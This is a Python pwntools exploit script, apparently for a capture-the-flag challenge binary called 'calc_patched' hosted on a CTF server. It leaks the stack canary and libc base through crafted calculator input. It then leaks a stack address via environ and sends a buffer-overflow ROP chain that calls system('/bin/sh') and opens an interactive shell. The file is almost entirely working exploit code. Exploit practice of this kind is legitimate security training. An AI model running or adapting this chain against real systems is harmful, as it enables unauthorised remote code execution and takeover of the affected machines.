from pwn import *
from icecream import ic

elf = exe = ELF("./calc_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("pwn.ctf.umasscybersec.org", 9000)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *get_feedback
# b *process+131
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a, drop = True, timeout = 1)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()


while True:
    try:
        ru(b"Enter global data (q to finish)")
        for i in range(1001):
            sl(b'0')
        sl(b'q')
        ru(b"Enter number of threads (q to quit)")
        sl(b'999')


        x = ru('Processing: 0 ^ 0 = 0')
        if x == b'':
            raise EOFError

        canary = []
        for i in range(7):
            ru("Processing: 0 ^ ")
            canary.append(ru(" "))
            
        for i in range(9):
            ru("Processing: 0 ^ ")

        libca = []
        for i in range(5):
            ru("Processing: 0 ^ ")
            libca.append(ru(" "))

        canary = canary[::-1]
        canary.append(b'00')
        canary = int(b''.join(canary), 16)
        ic(hex(canary))

        ic(libca)
        libca = libca[::-1]
        libca.append(b'0a')
        libc.address = int(b''.join(libca), 16) - 0x9570a
        ic(hex(libc.address))
        if libc.address & 0xFFF == 0x000:
            break

    except EOFError:
        continue



sla(b"Enter global data (q to finish)", b"q")
sla(b"Enter number of threads (q to quit)", b"q")
sla(b"Would you like to give feedback(y/N): ", b"y")

payload = b'a'*0x68
payload += p64(libc.sym['environ']) 

sl(payload)
stack_address = uu64(6) - 0x180
ic(hex(stack_address))

sla(b"Would you like to give feedback(y/N): ", b"y")
leave_ret = libc.address + 0x0000000000026acd
payload = b'a'*0x48
payload += p64(qgad(libc, "rdi") + 1)
payload += p64(qgad(libc, "rdi"))
payload += p64(binsh(libc))
payload += p64(libc.symbols["system"])

payload += p64(libc.sym['environ']) 
payload += p64(0)
payload += p64(canary) 
payload += p64(0) 
payload += p64(0) 
payload += p64(stack_address)
payload += p64(leave_ret)

sl(payload)

sl(b'n')
sl(b'ls')

io.interactive()
